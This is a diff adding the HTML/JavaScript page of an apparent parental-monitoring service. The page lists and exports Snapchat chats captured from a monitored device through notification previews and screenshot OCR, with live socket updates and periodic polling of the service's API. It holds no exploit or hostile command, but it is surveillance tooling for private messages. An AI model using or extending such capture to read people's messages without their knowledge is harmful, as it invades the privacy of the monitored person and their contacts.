@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Snapchat Message Viewer</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            background-color: #f2f2f2;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+        }
+
+        .app-container {
+            width: 100%;
+            height: 100%;
+            max-width: 450px;
+            background-color: #fff;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+        }
+
+        #snapListScreen { display: flex; flex-direction: column; height: 100%; width: 100%; }
+
+        .snap-header {
+            background: #fff;
+            padding: 10px 15px;
+            border-bottom: 1px solid #f0f0f0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 50px;
+        }
+
+        .header-left { display: flex; align-items: center; gap: 10px; cursor: pointer; }
+        .back-arrow-main { font-size: 1.2rem; color: #222; margin-right: 5px; }
+
+        .avatar-small {
+            width: 40px; height: 40px;
+            border-radius: 50%;
+            overflow: hidden;
+            display: flex; justify-content: center; align-items: center;
+            font-weight: bold; color: rgba(0,0,0,0.5); font-size: 1.2rem;
+        }
+
+        .page-title { font-weight: 700; font-size: 1.3rem; color: #000; flex: 1; text-align: center; }
+        .header-right { display: flex; gap: 15px; color: #444; font-size: 1.2rem; }
+        .header-right i { cursor: pointer; }
+
+        .privacy-note {
+            background: #FFF8E1;
+            border-left: 4px solid #FFB300;
+            padding: 10px 14px;
+            margin: 8px 12px;
+            border-radius: 6px;
+            font-size: 0.78rem;
+            color: #6D5A00;
+            line-height: 1.4;
+        }
+        .privacy-note i { color: #FFB300; margin-right: 6px; }
+
+        .search-bar {
+            padding: 6px 12px 10px;
+            background: #fff;
+        }
+        .search-bar input {
+            width: 100%;
+            box-sizing: border-box;
+            background: #f2f2f2;
+            border: none;
+            padding: 10px 16px 10px 36px;
+            border-radius: 20px;
+            font-size: 0.95rem;
+            outline: none;
+            color: #333;
+        }
+        .search-bar .search-icon {
+            position: absolute;
+            left: 26px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #aaa;
+            font-size: 0.85rem;
+            pointer-events: none;
+        }
+        .search-bar .wrap { position: relative; }
+
+        .friend-list { flex: 1; overflow-y: auto; }
+
+        .friend-row {
+            display: flex; align-items: center;
+            padding: 8px 15px;
+            border-bottom: 1px solid #fafafa;
+            cursor: pointer;
+            height: 64px;
+        }
+        .friend-row:active { background: #f8f8f8; }
+
+        .bitmoji {
+            width: 48px; height: 48px; margin-right: 12px;
+            border-radius: 50%;
+            overflow: hidden; display: flex; align-items: center; justify-content: center;
+            font-size: 1.4rem; color: #fff; text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+        }
+
+        .friend-data { flex: 1; display: flex; flex-direction: column; justify-content: center; overflow: hidden; }
+        .friend-data h3 { margin: 0; font-size: 1.1rem; font-weight: 600; color: #000; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+        .status-row { display: flex; align-items: center; gap: 6px; margin-top: 3px; }
+
+        .status-box { width: 10px; height: 10px; border-radius: 2px; display: inline-block; margin-right: 2px;}
+        .status-bubble { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 2px; border: 2px solid transparent;}
+
+        .st-red { background-color: #F23C57; }
+        .st-blue { background-color: #3CB2E2; }
+        .st-purple { background-color: #9B55A0; }
+
+        .st-text { font-size: 0.85rem; color: #657786; font-weight: 400; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden; }
+        .st-time { font-size: 0.85rem; color: #657786; margin-left: 5px; position: relative; padding-left: 5px;}
+        .st-time::before { content: "•"; position: absolute; left: -2px; color: #ddd; }
+
+        .cam-btn {
+            width: 40px; height: 40px; border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            color: #ccc; font-size: 1.2rem; border-left: 1px solid #fafafa;
+        }
+
+        .source-tag {
+            font-size: 0.6rem;
+            padding: 1px 5px;
+            border-radius: 3px;
+            margin-left: 6px;
+            font-weight: 600;
+            vertical-align: middle;
+        }
+        .source-api { background: #E8F5E9; color: #2E7D32; }
+        .source-fallback { background: #FFF3E0; color: #E65100; }
+
+        #snapChatScreen {
+            display: none;
+            flex-direction: column; height: 100%;
+            background: #fff;
+            position: absolute; top: 0; left: 0; width: 100%;
+            z-index: 20;
+        }
+
+        .chat-top {
+            padding: 10px; border-bottom: 1px solid #f0f0f0;
+            display: flex; align-items: center; gap: 10px; height: 50px;
+        }
+        .chat-name { font-weight: 700; font-size: 1.1rem; flex: 1; color: #000; }
+
+        .snap-msgs {
+            flex: 1; padding: 15px; overflow-y: auto;
+            display: flex; flex-direction: column; gap: 4px;
+        }
+
+        .s-msg {
+            padding: 8px 12px;
+            max-width: 75%;
+            font-size: 1.05rem;
+            position: relative;
+            background: #fff;
+            color: #000;
+            border-left: 3px solid #eee;
+            margin-bottom: 5px;
+            cursor: pointer;
+            transition: 0.2s;
+            border-radius: 0 12px 12px 0;
+        }
+        .s-msg:hover { background: #f9f9f9; }
+
+        .s-msg.ocr-msg {
+            background: #F3E5F5;
+            border-left: 3px solid #9B55A0;
+            border-radius: 0 12px 12px 0;
+        }
+        .s-msg.ocr-msg:hover { background: #EDE7F6; }
+
+        .ocr-tag {
+            display: inline-block;
+            font-size: 0.6rem;
+            background: #9B55A0;
+            color: #fff;
+            padding: 1px 6px;
+            border-radius: 3px;
+            margin-left: 6px;
+            vertical-align: middle;
+            font-weight: 600;
+        }
+
+        .s-in { align-self: flex-start; }
+        .s-out { align-self: flex-end; background: #E3F2FD; border-left: none; border-right: 3px solid #3CB2E2; border-radius: 12px 0 0 12px; }
+        .s-out:hover { background: #BBDEFB; }
+        .s-time-float { font-size: 0.65rem; color: #ccc; display: block; margin-top: 2px;}
+
+        .chat-bottom { padding: 10px; border-top: 1px solid #eee; display: flex; align-items: center; gap: 10px; background: #fff; }
+        .snap-input { flex: 1; background: #eee; border: none; padding: 12px 20px; border-radius: 20px; outline: none; font-size: 1rem; }
+
+        .bottom-nav {
+            height: 60px; border-top: 1px solid #eee; display: flex; justify-content: space-around; align-items: center; background: #fff;
+        }
+        .nav-item { font-size: 1.4rem; color: #aaa; }
+        .nav-active { color: #3CB2E2; }
+
+        .empty-state {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 60px 20px; color: #bbb;
+        }
+        .empty-state i { font-size: 2.5rem; margin-bottom: 12px; }
+        .empty-state span { font-size: 0.95rem; }
+
+        .live-dot {
+            width: 7px; height: 7px; background: #4CAF50; border-radius: 50%;
+            display: inline-block; margin-left: 6px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .export-btn {
+            background: none; border: none; color: #444; font-size: 1.1rem; cursor: pointer;
+            padding: 4px;
+        }
+        .export-btn:active { color: #3CB2E2; }
+
+        .loading-spinner {
+            display: flex; justify-content: center; align-items: center; height: 200px; color: #ccc;
+        }
+        .loading-spinner i { margin-right: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <div id="snapListScreen">
+            <div class="snap-header">
+                <div class="header-left" onclick="window.location.href='index.html'">
+                    <i class="fa-solid fa-chevron-left back-arrow-main"></i>
+                    <div class="avatar-small" style="background: #eee;">
+                        <i class="fa-solid fa-user"></i>
+                    </div>
+                </div>
+
+                <div class="page-title">Chat<span class="live-dot" id="liveDot" style="display:none;"></span></div>
+
+                <div class="header-right">
+                    <button class="export-btn" onclick="exportData()" title="Export"><i class="fa-solid fa-file-export"></i></button>
+                    <i class="fa-solid fa-user-plus"></i>
+                    <i class="fa-solid fa-ellipsis"></i>
+                </div>
+            </div>
+
+            <div class="privacy-note">
+                <i class="fa-solid fa-shield-halved"></i>
+                <strong>NOTE:</strong> Snapchat privacy — direct text capture limited. Jo notification previews milte hain + OCR screenshots se text extract hota hai (best effort)
+            </div>
+
+            <div class="search-bar">
+                <div class="wrap">
+                    <i class="fa-solid fa-magnifying-glass search-icon"></i>
+                    <input type="text" id="searchInput" placeholder="Search conversations..." oninput="filterContacts()">
+                </div>
+            </div>
+
+            <div class="friend-list" id="snapContainer">
+                <div class="loading-spinner">
+                    <i class="fa-solid fa-ghost fa-bounce" style="font-size:2rem;"></i> Loading...
+                </div>
+            </div>
+
+            <div class="bottom-nav">
+                <div class="nav-item"><i class="fa-solid fa-location-dot"></i></div>
+                <div class="nav-item nav-active"><i class="fa-solid fa-message"></i></div>
+                <div class="nav-item"><i class="fa-solid fa-camera" style="font-size:1.8rem; color:#FFFC00; -webkit-text-stroke: 1px #ddd;"></i></div>
+                <div class="nav-item"><i class="fa-solid fa-user-group"></i></div>
+                <div class="nav-item"><i class="fa-solid fa-play"></i></div>
+            </div>
+        </div>
+
+        <div id="snapChatScreen">
+            <div class="chat-top">
+                <i class="fa-solid fa-chevron-left" style="font-size:1.5rem; color:#222; cursor:pointer; padding:5px; margin-right: 5px;" onclick="closeSnap()"></i>
+                <div class="bitmoji" id="chatAvatar" style="width:35px; height:35px; font-size:1rem; margin-right:8px;">&#x1F47B;</div>
+                <div class="chat-name" id="snapName">Friend</div>
+                <i class="fa-solid fa-phone" style="font-size:1rem; color:#444; margin-right:15px; background:#f0f0f0; padding:10px; border-radius:50%"></i>
+                <i class="fa-solid fa-video" style="font-size:1rem; color:#444; background:#f0f0f0; padding:10px; border-radius:50%"></i>
+            </div>
+
+            <div class="snap-msgs" id="snapMsgsBox">
+            </div>
+
+            <div class="chat-bottom">
+                <i class="fa-solid fa-camera" style="color:#222; font-size:1.2rem; background:#f0f0f0; padding:10px; border-radius:50%"></i>
+                <input type="text" class="snap-input" placeholder="Send a chat">
+                <i class="fa-solid fa-microphone" style="color:#222; font-size:1.2rem; margin-left: 5px;"></i>
+            </div>
+        </div>
+
+    </div>
+
+    <script src="socket.io.min.js"></script>
+    <!-- Local socket.io.min.js – fixes CDN timeout -->
+    <script>
+        // --- AUTH CHECK ---
+        (function(){
+            var t = localStorage.getItem("access_token");
+            if(!t){ window.location.href='/login'; return; }
+            try {
+                var u = JSON.parse(localStorage.getItem("user") || "{}");
+                if(!u.email){ window.location.href='/login'; }
+            } catch(e){ window.location.href='/login'; }
+        })();
+
+        const params = new URLSearchParams(window.location.search);
+        const DEVICE_ID = params.get('id') || localStorage.getItem('monitoring_id');
+        const SERVER = "https://parents-control-website1.onrender.com";
+        const CHAT_CONTACTS_URL = `${SERVER}/api/chat_contacts`;
+        const CHATS_URL = `${SERVER}/api/chats`;
+        const FALLBACK_URL = `${SERVER}/api/get-data`;
+        const DATA_TYPE = "snapchat";
+
+        if (!DEVICE_ID) {
+            alert("Device ID missing! Redirecting...");
+            window.location.href = 'index.html';
+        }
+
+        let groupedSnaps = {};
+        let isFetching = false;
+        let contactsRequestInFlight = false;
+        let currentContact = null;
+        let useChatApi = true;
+
+        function getAvatarColor(name) {
+            const colors = ['#FF6B6B', '#4ECDC4', '#45B7D1', '#96CEB4', '#FFEEAD', '#D4A5A5', '#9B59B6', '#3498DB'];
+            let hash = 0;
+            for (let i = 0; i < name.length; i++) {
+                hash = name.charCodeAt(i) + ((hash << 5) - hash);
+            }
+            return colors[Math.abs(hash) % colors.length];
+        }
+
+        function getInitials(name) {
+            return name.substring(0, 1).toUpperCase();
+        }
+
+        function escapeHtml(text) {
+            const d = document.createElement('div');
+            d.textContent = text;
+            return d.innerHTML;
+        }
+
+        async function fetchChatContacts() {
+            try {
+                if (contactsRequestInFlight) return false;
+                contactsRequestInFlight = true;
+                const res = await fetch(`${CHAT_CONTACTS_URL}?childId=${encodeURIComponent(DEVICE_ID)}&app=snapchat`, { cache: 'no-store' });
+                if (!res.ok) throw new Error('Chat contacts API unavailable');
+                const data = await res.json();
+                if (data && Array.isArray(data) && data.length > 0) {
+                    useChatApi = true;
+                    processChatContacts(data);
+                    return true;
+                }
+                return false;
+            } catch (e) {
+                console.warn("Chat contacts API failed:", e.message);
+                return false;
+            } finally {
+                contactsRequestInFlight = false;
+            }
+        }
+
+        function processChatContacts(conversations) {
+            const tempGroup = {};
+            conversations.forEach(conv => {
+                const name = conv.conversation || conv.contact || conv.name || "Unknown";
+                const lastMsg = conv.lastMessage || conv.last_message || conv.preview || "";
+                const lastTime = conv.timestamp || conv.last_time || Date.now();
+                const source = conv.source || "api";
+
+                const previous = groupedSnaps[name];
+                tempGroup[name] = {
+                    name: name,
+                    lastMsg: lastMsg,
+                    lastTime: lastTime,
+                    source: source,
+                    msgs: previous && previous.msgs ? previous.msgs : [],
+                    _loaded: Boolean(previous && previous._loaded)
+                };
+            });
+
+            if (JSON.stringify(Object.keys(groupedSnaps).sort()) !== JSON.stringify(Object.keys(tempGroup).sort())) {
+                groupedSnaps = tempGroup;
+                renderSnaps();
+            } else {
+                groupedSnaps = tempGroup;
+                renderSnaps();
+            }
+        }
+
+        async function fetchChatMessages(contactName) {
+            try {
+                const res = await fetch(`${CHATS_URL}?childId=${encodeURIComponent(DEVICE_ID)}&app=snapchat&contact=${encodeURIComponent(contactName)}`, { cache: 'no-store' });
+                if (!res.ok) throw new Error('Chats API unavailable');
+                const data = await res.json();
+                if (data && Array.isArray(data)) {
+                    return data.map(m => ({
+                        text: m.text || m.content || "",
+                        timeStr: new Date(m.timestamp || m.time || Date.now()).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
+                        rawTime: m.timestamp || m.time || Date.now(),
+                        source: m.source || "notification",
+                        isOcr: (m.source === "ocr" || m.source === "screenshot_ocr"),
+                        direction: m.direction || "IN"
+                    }));                }
+                return null;
+            } catch (e) {
+                console.warn("Chat messages API failed:", e.message);
+                return null;
+            }
+        }
+
+        async function fetchSnapDataFallback() {
+            if (isFetching) return;
+            isFetching = true;
+            try {
+                const response = await fetch(`${FALLBACK_URL}/${DEVICE_ID}/${DATA_TYPE}?t=${Date.now()}`);
+                const result = await response.json();
+                if (Array.isArray(result) && result.length > 0) {
+                    useChatApi = false;
+                    processSnapData(result);
+                } else if (Object.keys(groupedSnaps).length === 0) {
+                    showEmptyState();
+                }
+            } catch (error) {
+                console.error("Error fetching fallback data:", error);
+            } finally {
+                isFetching = false;
+            }
+        }
+
+        function processSnapData(logs) {
+            logs.sort((a, b) => (a.time || 0) - (b.time || 0));
+            const tempGroup = {};
+
+            logs.forEach(log => {
+                let rawTitle = (log.title || "").trim();
+                let rawText = (log.text || "").trim();
+                let time = log.time || Date.now();
+
+                if (rawText.includes("is typing") || rawText.includes("Updating") || rawText === "New Snap") return;
+
+                let senderName = "Unknown";
+                let messageBody = rawText;
+
+                if (rawTitle === "Snapchat") {
+                    if (rawText.includes(":")) {
+                        let parts = rawText.split(":");
+                        senderName = parts[0].trim();
+                        messageBody = parts.slice(1).join(":").trim();
+                    } else if (rawText.toLowerCase().includes("snap")) {
+                        senderName = "Snap Team";
+                    } else {
+                        senderName = "Snapchat";
+                    }
+                } else {
+                    senderName = rawTitle;
+                }
+
+                if (!tempGroup[senderName]) {
+                    tempGroup[senderName] = { name: senderName, lastMsg: "", lastTime: 0, msgs: [], source: "fallback" };
+                }
+
+                const isOcr = log.source === "ocr" || log.source === "screenshot_ocr";
+
+                tempGroup[senderName].msgs.push({
+                    text: messageBody,
+                    timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
+                    rawTime: time,
+                    source: log.source || "notification",
+                    isOcr: isOcr
+                });
+
+                tempGroup[senderName].lastMsg = messageBody;
+                tempGroup[senderName].lastTime = time;
+            });
+
+            if (JSON.stringify(groupedSnaps) !== JSON.stringify(tempGroup)) {
+                groupedSnaps = tempGroup;
+                renderSnaps();
+            }
+        }
+
+        function showEmptyState() {
+            document.getElementById('snapContainer').innerHTML = `
+                <div class="empty-state">
+                    <i class="fa-solid fa-ghost"></i>
+                    <span>No Snapchat data captured yet</span>
+                </div>`;
+        }
+
+        function renderSnaps() {
+            const con = document.getElementById('snapContainer');
+            const query = (document.getElementById('searchInput').value || "").toLowerCase();
+            const users = Object.keys(groupedSnaps);
+
+            if (users.length === 0) {
+                showEmptyState();
+                return;
+            }
+
+            const scrollPos = con.scrollTop;
+            const filtered = users.filter(u => u.toLowerCase().includes(query));
+
+            if (filtered.length === 0) {
+                con.innerHTML = `<div class="empty-state"><i class="fa-solid fa-magnifying-glass"></i><span>No matches found</span></div>`;
+                return;
+            }
+
+            filtered.sort((a, b) => groupedSnaps[b].lastTime - groupedSnaps[a].lastTime);
+
+            let html = "";
+            filtered.forEach(user => {
+                const s = groupedSnaps[user];
+                let statusHtml = `<span class="status-box st-red"></span> <span class="st-text" style="color:#F23C57; font-weight:600">New Snap</span>`;
+
+                if (!s.lastMsg.toLowerCase().includes("snap")) {
+                    statusHtml = `<span class="status-bubble st-blue" style="background:#3CB2E2"></span> <span class="st-text" style="color:#3CB2E2; font-weight:600">New Chat</span>`;
+                }
+
+                const avatarColor = getAvatarColor(user);
+                const initial = getInitials(user);
+                const sourceTag = s.source === "api"
+                    ? `<span class="source-tag source-api">API</span>`
+                    : `<span class="source-tag source-fallback">SYNC</span>`;
+
+                html += `
+                    <div class="friend-row" onclick="openSnap('${escapeHtml(user).replace(/'/g, "\\'")}', '${avatarColor}')">
+                        <div class="bitmoji" style="background: ${avatarColor};">
+                            ${initial}
+                        </div>
+                        <div class="friend-data">
+                            <h3>${escapeHtml(s.name)}${sourceTag}</h3>
+                            <div class="status-row">
+                                ${statusHtml}
+                                <span class="st-text" style="color:#999; margin-left:5px;">&bull; ${escapeHtml(s.lastMsg)}</span>
+                                <span class="st-time">${new Date(s.lastTime).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
+                            </div>
+                        </div>
+                        <div class="cam-btn"><i class="fa-regular fa-comment-dots"></i></div>
+                    </div>`;
+            });
+
+            con.innerHTML = html;
+            con.scrollTop = scrollPos;
+        }
+
+        function filterContacts() {
+            renderSnaps();
+        }
+
+        async function openSnap(userName, color) {
+            currentContact = userName;
+            const s = groupedSnaps[userName];
+
+            if (!s) return;
+
+            document.getElementById('snapName').innerText = s.name;
+            document.getElementById('chatAvatar').innerText = getInitials(s.name);
+            document.getElementById('chatAvatar').style.background = color;
+
+            const box = document.getElementById('snapMsgsBox');
+            box.innerHTML = `<div class="loading-spinner" style="height:100px;"><i class="fa-solid fa-spinner fa-spin"></i> Loading...</div>`;
+
+            document.getElementById('snapListScreen').style.display = 'none';
+            document.getElementById('snapChatScreen').style.display = 'flex';
+
+            let messages = (s._loaded && s.msgs && s.msgs.length > 0) ? s.msgs : null;
+
+            if (!messages && useChatApi) {
+                messages = await fetchChatMessages(userName);
+                if (messages) {
+                    s.msgs = messages;
+                    s._loaded = true;
+                }
+            }
+
+            if (!messages && s.msgs && s.msgs.length > 0) {
+                messages = s.msgs;
+            }
+
+            if (!messages || messages.length === 0) {
+                if (useChatApi) {
+                    await fetchSnapDataFallback();
+                    if (groupedSnaps[userName] && groupedSnaps[userName].msgs.length > 0) {
+                        messages = groupedSnaps[userName].msgs;
+                    }
+                }
+            }
+
+            box.innerHTML = "";
+
+            if (!messages || messages.length === 0) {
+                box.innerHTML = `<div class="empty-state"><i class="fa-solid fa-comment-slash"></i><span>No messages captured</span></div>`;
+                return;
+            }
+
+            messages.sort((a, b) => (a.rawTime || 0) - (b.rawTime || 0));
+
+            messages.forEach(m => {
+                let borderStyle = "border-left: 3px solid #3CB2E2;";
+                if (m.text.toLowerCase().includes("snap")) borderStyle = "border-left: 3px solid #F23C57;";
+
+                const isOcr = m.isOcr || m.source === "ocr" || m.source === "screenshot_ocr";
+                const ocrClass = isOcr ? "ocr-msg" : "";
+                const ocrTag = isOcr ? `<span class="ocr-tag">&#x1F4F8; OCR captured</span>` : "";
+
+                // Determine direction for left/right alignment
+                const dir = (m.direction || "IN").toString().toUpperCase();
+                const isOutgoing = (dir === "OUT" || dir === "SENT" || dir === "ME");
+                const alignClass = isOutgoing ? "s-out" : "s-in";
+                if (isOutgoing) borderStyle = "border-right: 3px solid #3CB2E2;";
+
+                box.innerHTML += `
+                    <div class="s-msg ${alignClass} ${ocrClass}" style="${borderStyle}">
+                        ${escapeHtml(m.text)}${ocrTag}
+                        <span class="s-time-float">${m.timeStr}</span>
+                    </div>`;
+            });
+
+            box.scrollTop = box.scrollHeight;
+        }
+
+        function closeSnap() {
+            currentContact = null;
+            document.getElementById('snapChatScreen').style.display = 'none';
+            document.getElementById('snapListScreen').style.display = 'flex';
+        }
+
+        function exportData() {
+            const exportObj = {
+                device: DEVICE_ID,
+                app: "snapchat",
+                exported_at: new Date().toISOString(),
+                contacts: {}
+            };
+
+            Object.keys(groupedSnaps).forEach(name => {
+                const s = groupedSnaps[name];
+                exportObj.contacts[name] = {
+                    lastMsg: s.lastMsg,
+                    lastTime: s.lastTime,
+                    source: s.source,
+                    messages: (s.msgs || []).map(m => ({
+                        text: m.text,
+                        time: m.rawTime,
+                        source: m.source || "unknown",
+                        isOcr: m.isOcr || false
+                    }))
+                };
+            });
+
+            const blob = new Blob([JSON.stringify(exportObj, null, 2)], { type: "application/json" });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `snapchat_${DEVICE_ID}_${Date.now()}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function initSocket() {
+            try {
+                const socket = io(SERVER, { transports: ['websocket', 'polling'] });
+
+                socket.on('connect', () => {
+                    console.log("Socket connected for live chat updates");
+                    document.getElementById('liveDot').style.display = 'inline-block';
+                    socket.emit('join', DEVICE_ID);
+                });
+
+                socket.on('disconnect', () => {
+                    document.getElementById('liveDot').style.display = 'none';
+                });
+
+                socket.on('chat_update', async (data) => {
+                    if (!data || (data.device_id && String(data.device_id).toUpperCase() !== String(DEVICE_ID).toUpperCase())) return;
+                    if (data.app && String(data.app).toLowerCase() !== 'snapchat') return;
+
+                    const updateContact = data.contact || data.contactName || data.chat_with || data.conversation;
+                    console.log("Live chat_update received:", {
+                        app: data.app, contact: updateContact, direction: data.direction,
+                        text: data.text || data.message, timestamp: data.timestamp, eventId: data.eventId
+                    });
+
+                    if (useChatApi) {
+                        const ok = await fetchChatContacts();
+                        if (!ok) await fetchSnapDataFallback();
+                    } else {
+                        await fetchSnapDataFallback();
+                    }
+
+                    if (updateContact && currentContact !== updateContact && groupedSnaps[updateContact]) {
+                        groupedSnaps[updateContact]._loaded = false;
+                    }
+                    if (currentContact && groupedSnaps[currentContact]) {
+                        groupedSnaps[currentContact]._loaded = false;
+                        openSnap(currentContact, getAvatarColor(currentContact));
+                    }
+                });
+            } catch (e) {
+                console.warn("Socket.io init failed:", e.message);
+            }
+        }
+
+        async function initialLoad() {
+            const chatOk = await fetchChatContacts();
+            if (!chatOk) {
+                await fetchSnapDataFallback();
+            }
+        }
+
+        initialLoad();
+        setInterval(async () => {
+            if (useChatApi) {
+                const ok = await fetchChatContacts();
+                if (!ok) await fetchSnapDataFallback();
+            } else {
+                await fetchSnapDataFallback();
+            }
+        }, 15000);
+
+        initSocket();
+    </script>
+</body>
+</html>
